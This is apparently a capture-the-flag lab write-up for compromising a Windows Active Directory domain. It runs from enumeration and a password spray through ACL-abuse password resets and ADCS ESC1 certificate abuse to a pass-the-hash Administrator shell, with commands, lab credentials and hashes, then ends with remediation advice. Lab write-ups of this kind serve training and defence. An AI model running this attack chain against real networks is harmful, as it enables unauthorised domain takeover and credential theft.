---
{"dg-publish":true,"permalink":"/welcome/","dg-note-properties":{}}
---

# Welcome Lab — Penetration Test Report

---

## Enumeration

### Nmap

Ran a full port scan against the target:

```shell
nmap -sV -sC -p- --min-rate 5000 10.1.135.197
```

Identified a classic Active Directory Domain Controller:

- **53** — DNS
- **88** — Kerberos
- **135/139/445** — SMB (signing: **True**)
- **389/3268** — LDAP (Domain: `WELCOME.local`)
- **3389** — RDP
- **5985** — WinRM

Key findings:

- Domain: `WELCOME.local`
- DC hostname: `DC01.WELCOME.local`
- OS: Windows Server 2022 (Build 20348)

---

### User Enumeration

#### SMB Enumeration

Authenticated with provided credentials and enumerated shares:

```shell
netexec smb 10.1.135.197 -u 'e.hills' -p 'Il0vemyj0b2025!' --shares
netexec smb 10.1.135.197 -u 'e.hills' -p 'Il0vemyj0b2025!' --users
```

Discovered shares:

- `ADMIN$` — Remote Admin
- `C$` — Default share
- `Human Resources` — **READ**
- `IPC$` — READ
- `NETLOGON` — READ
- `SYSVOL` — READ

Discovered users:

- `Administrator`
- `e.hills`
- `j.crickets`
- `e.blanch`
- `i.park` _(IT Intern)_
- `j.johnson`
- `a.harris`
- `svc_ca`
- `svc_web`

---

## Initial Access

### Starting Credentials

Engagement began with phishing-obtained credentials:

```
e.hills : Il0vemyj0b2025!
```

Credentials validated successfully against SMB.

---

## SMB Share Enumeration

### Human Resources Share

Accessed the `Human Resources` share and downloaded all PDF documents:

```shell
smbclient //10.1.135.197/'Human Resources' -U 'WELCOME.local/e.hills%Il0vemyj0b2025!' -c 'recurse ON; mget *'
```

Files retrieved:

- `Welcome 2025 Holiday Schedule.pdf`
- `Welcome Benefits.pdf`
- `Welcome Handbook Excerpts.pdf`
- `Welcome Performance Review Guide.pdf`
- `Welcome Start Guide.pdf` _(password protected)_

### PDF Password Cracking

The `Welcome Start Guide.pdf` was password protected. Cracked using John the Ripper:

```shell
pdf2john "Welcome Start Guide.pdf" > pdf_hash.txt
john pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password found:** `humanresources`

### Credential Discovery

The decrypted `Welcome Start Guide.pdf` revealed the default onboarding password:

```
Temporary/default password: Welcome2025!@
```

---

## Password Spray

Sprayed the default password against all discovered domain users:

```shell
netexec smb 10.1.135.197 -u users.txt -p 'Welcome2025!@' --continue-on-success
```

**Hit:** `a.harris:Welcome2025!@` — user had not changed the default password.

---

## Shell as a.harris

Confirmed WinRM access and obtained a shell:

```shell
netexec winrm 10.1.135.197 -u 'a.harris' -p 'Welcome2025!@'
evil-winrm -i 10.1.135.197 -u 'a.harris' -p 'Welcome2025!@'
```

### User Flag

```shell
type C:\Users\a.harris\Desktop\user.txt
```

> **Flag:** `46fa545e76f2b279ca97bd2c7f39ba12`

---

## BloodHound Enumeration

Collected domain data using BloodHound:

```shell
bloodhound-python -d WELCOME.local -u a.harris -p 'Welcome2025!@' -ns 10.1.135.197 -c DCOnly --zip
```

### Key Findings

- `WELCOME\HR` group has **GenericAll** over `i.park`
- `i.park` (HelpDesk) has **ForceChangePassword (ExtendedRight)** over `svc_ca`
- `svc_ca` has enrollment rights on **ADCS template** with **ESC1** vulnerability

---

## Privilege Escalation Path

```
a.harris (HR group)
    ↓ GenericAll → i.park
i.park password reset
    ↓ HelpDesk ExtendedRight → svc_ca
svc_ca password reset (net rpc)
    ↓ ESC1 (Welcome-Template)
Certificate as Administrator
    ↓ Certipy auth → NT Hash
Pass-the-Hash → Administrator shell
    ↓
root.txt
```

---

## ACL Abuse — HR → i.park

The `HR` group had **GenericAll** over `i.park`. Used this to reset `i.park`'s password:

```shell
# As a.harris in Evil-WinRM
Set-ADAccountPassword -Identity i.park -NewPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) -Reset
```

---

## ACL Abuse — i.park → svc_ca

`i.park` (HelpDesk) held **ForceChangePassword** over `svc_ca`. Reset the password using net rpc:

```shell
net rpc password svc_ca 'Hacked123!' -U 'WELCOME.local/i.park%Hacked123!' -S 10.1.135.197
```

---

## ADCS Enumeration

Enumerated ADCS using Certipy:

```shell
netexec ldap 10.1.135.197 -u 'e.hills' -p 'Il0vemyj0b2025!' -M adcs
/home/kali/.local/bin/certipy find -u 'svc_ca@WELCOME.local' -p 'Hacked123!' -dc-ip 10.1.135.197 -vulnerable -stdout
```

### Vulnerable Template Found

|Property|Value|
|---|---|
|Template Name|`Welcome-Template`|
|CA Name|`WELCOME-CA`|
|Vulnerability|**ESC1**|
|Enrollment Rights|`WELCOME.LOCAL\svc ca`|
|Issue|Enrollee supplies subject + Client Authentication|

---

## ESC1 Exploitation

### Step 1 — Request Certificate as Administrator

```shell
/home/kali/.local/bin/certipy req \
  -u 'svc_ca@WELCOME.local' \
  -p 'Hacked123!' \
  -dc-ip 10.1.135.197 \
  -target DC01.WELCOME.local \
  -ca 'WELCOME-CA' \
  -template 'Welcome-Template' \
  -upn 'administrator@WELCOME.local'
```

Certificate saved to `administrator.pfx`.

### Step 2 — Authenticate and Retrieve NT Hash

```shell
/home/kali/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.1.135.197
```

**NT Hash retrieved:**

```
aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a
```

---

## Shell as Administrator

Pass-the-Hash using Evil-WinRM:

```shell
evil-winrm -i 10.1.135.197 -u Administrator -H '0cf1b799460a39c852068b7c0574677a'
```

### Root Flag

```shell
type C:\Users\Administrator\Desktop\root.txt
```

> **Flag:** `7fbb500e363e81691681f6880ed38631`

---

## Vulnerabilities Summary

|#|Vulnerability|Severity|Impact|
|---|---|---|---|
|1|Default password not changed (`a.harris`)|High|Initial foothold|
|2|Password-protected PDF in accessible share|Medium|Credential disclosure|
|3|Excessive ACL — HR GenericAll over i.park|High|Lateral movement|
|4|HelpDesk ForceChangePassword over svc_ca|High|Service account takeover|
|5|ADCS ESC1 — Welcome-Template misconfiguration|Critical|Domain Admin escalation|

---

## Remediation Recommendations

- **Enforce password change** on first login for all new accounts
- **Remove sensitive documents** from widely accessible SMB shares; use encrypted storage
- **Review AD ACLs** and remove unnecessary GenericAll/ForceChangePassword permissions
- **Fix ADCS template** — disable "Enrollee Supplies Subject" or restrict enrollment rights
- **Implement least privilege** for service accounts like `svc_ca`
- **Enable SMB signing** on all domain-joined machines

---

_Report generated for HackSmarter Labs — Welcome Lab_